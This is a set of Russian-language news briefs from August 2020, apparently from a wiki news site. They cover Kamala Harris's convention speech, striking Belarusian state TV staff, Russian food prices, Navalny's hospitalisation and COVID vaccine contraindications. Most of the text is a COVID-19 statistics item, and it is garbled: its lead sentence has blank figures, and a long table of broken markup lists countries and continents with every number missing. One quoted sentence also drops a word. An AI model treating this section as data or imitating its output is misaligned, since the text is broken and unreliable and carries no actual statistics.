Харрис призвала голосовать за кандидата демократов Джо Байдена: «Мы обязаны избрать президента, который привнесет что-то другое, что-то лучшее и сделает важную работу. Президента, который объединит нас — черных, белых, латинос, азиатов, коренных обитателей Америки — чтобы достичь будущего, которого мы все хотим. Мы обязаны избрать Джо Байдена».
Харрис рассказала о достоинствах Байдена, пообещав, что Байден сумеет объединить Америку. Она подвергла критике президента Дональда Трампа: «Сейчас у нас президент, который превращает наши трагедии в политическое оружие».
Камала Харрис подчеркнула: «Вы — патриоты, которые напомнили нам, что любить нашу страну — это сражаться за идеалы нашей страны».
«На этих выборах у нас есть шанс курс истории», — сказала Харрис. Она добавила, что эти выборы имеют важное значение не для Джо Байдена и для нее, а для всех американцев, чтобы больше работающих семей вели достойный образ жизни.
Кандидат в вице-президенты США завершила речь традиционной фразой: «Благослови вас Господь. И благослови Господь Соединенные Штаты Америки».
 
Источники

Режиссер белорусского государственного телеканала заявила, что ей и другим бастующим работникам не разрешили продолжить выполнять свою работу.
По ее словам, их заменили российскими специалистами, привезенными в страну на фоне масштабных антиправительственных демонстраций.
На видео, размещенном на белорусском новостном сайте TUT.BY в среду, журналист представляется Аленой Мартиновской, режиссером государственного телерадиоканала Беларусь-3.
Она сказала, что охранник не пустил ее в здание телекомпании, заявив, что она внесена «в черный список».
Мартиновская предположила, что в «черный список» включены люди, которые выражали недовольство по поводу недавних выборов.
Режиссер «Беларуси-3» заявила, что белорусских журналистов, вышедших на забастовку или уволившихся, чтобы выразить свое неприятие Лукашенко, заменили российскими командами.
«Прилетело два самолета сотрудников из России, которые выполняют наши функции за очень большую сумму», – сказала Мартиновская.
 
Источники

В России с 11 по 17 августа заметней всего выросли цены на сахар-песок, гречку, некоторые категории мяса и на детские фруктово-ягодные консервы. Об этом со ссылкой на Росстат сообщает "РИА Новости" в среду, 19 августа.
Так, за неделю сахар подорожал в среднем на 0,5%. На 0,3% вырос ценник на свинину, баранину и фруктово-ягодные консервы для детского питания. Стоимость гречки увеличилась на 0,2%.
Одновременно некоторые категории продовольственных товаров подешевели. В частности, на 0,5% меньше стало стоить пшено, на 0,3% — стерилизованное молоко. Сметана, куриные яйца и макаронные изделия потеряли в цене 0,2%. Цены на плодоовощную продукцию в среднем снизились на 3,2%.
 
Источники

Алексея Навального госпитализировала скорая помощь в Омске после экстренной посадки самолёта, летевшего из Томска в Москву.
Это сообщила в Twitter его пресс-секретарь Кира Ярмыш:
 
Ярмыш рассказала «Медиазоне», что у политика до взлёта симптомов не было, а сейчас он без сознания и в реанимации.
Она предполагает, что оппозиционера отравили:
 
Алексей Навальный во время визита в Сибирь посетил несколько регионов и встретился с волонтёрами. В том числе Новосибирск, в котором, по информации Тайги. инфо, возможно собирал материал для расследования о депутатах от «Единой России».
Летом 2019 года Алексея Навального госпитализировали в больницу из спецприемника. У него диагностировали токсический керато-конъюнктивит и общее отравление. Предположительно, Навального отравили, когда он отбывал административный арест за призывы участвовать в акции 27 июля 2019 года.
 
 
 
Источники
* 
*

Прививку от COVID-19 не сделают людям с повышенной температурой тела и тем, кто накануне употреблял алкоголь. Об этом со ссылкой на доктора медицинских наук, врача-иммунолога Владислава Жемчугова сообщает "РИА Новости" в четверг, 20 августа.
Кампания по вакцинации россиян от коронавируса должна стартовать осенью. Врач уточнил, что ограничения перед процедурой схожи с теми, которые действуют при прививках от гриппа.
Так, вакцину не получат люди с температурой, значительно превышающей 37 градусов. Противопоказана она и при признаках ОРВИ.
"Перед вакцинацией точно нельзя пить алкоголь. Вакцина может среагировать так, что человеку не будет хорошо. Я думаю, что часов за 10-12 или даже за сутки до вакцинации не надо пить. Время зависит от того, как печень работает у человека", — рассказал иммунолог в эфире радио Sputnik.
Жемчугов призвал также не стесняться задавать медикам вопросы, приходя на вакцинацию. Так, например, не помешает поинтересоваться сроком годности препарата, посмотреть температуру в холодильнике, где он хранится — должно быть не выше +4 градусов.
"Вакцинацию должен делать врач, а не просто медсестра", — добавил эксперт.
Первая в мире вакцина от коронавируса зарегистрирована в России под названием "Спутник V". Что представляет собой прививка от COVID-19 и как она будет работать, читайте в материале«Клопс».
 
Источники

На 04:28 GMT 20 августа 2020 года в мире выявлено SARS-CoV-2 ( случаев). За всё время от коронавирусной инфекции COVID-19 умерло ( ), выздоровело . На данный момент болеют , из них находятся в критическом состоянии. На 1 млн жителей планеты приходится заражённых и умерших.
 
 
 
 }||Мир|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Все||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||США|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Бразилия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Индия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Россия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Южно-Африканская Республика|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Перу|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мексика|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Колумбия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Чили|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Испания|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"|N/A||style="text-align:right"|N/A||style="text-align:right"|N/A||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Иран|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Великобритания|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"|N/A||style="text-align:right"|N/A||style="text-align:right"|N/A||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Аргентина|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Саудовская Аравия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Пакистан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Бангладеш|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Италия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Турция|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Германия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Франция|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ирак|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Филиппины|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Индонезия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Канада|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Катар|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Боливия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Эквадор|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Казахстан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Израиль|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Египет|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Украина|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Доминиканская Республика|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Швеция|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"|N/A||style="text-align:right"|N/A||style="text-align:right"|N/A||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Панама|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Оман|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Бельгия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Кувейт|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Румыния|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Белоруссия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||ОАЭ|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гватемала|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Нидерланды|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"|N/A||style="text-align:right"|N/A||style="text-align:right"|N/A||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Польша|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Япония|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сингапур|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Португалия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гондурас|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Нигерия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Бахрейн|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Марокко|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гана|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Киргизия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Армения|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Алжир|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Швейцария|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Афганистан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Узбекистан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Венесуэла|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Азербайджан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Эфиопия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Молдавия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
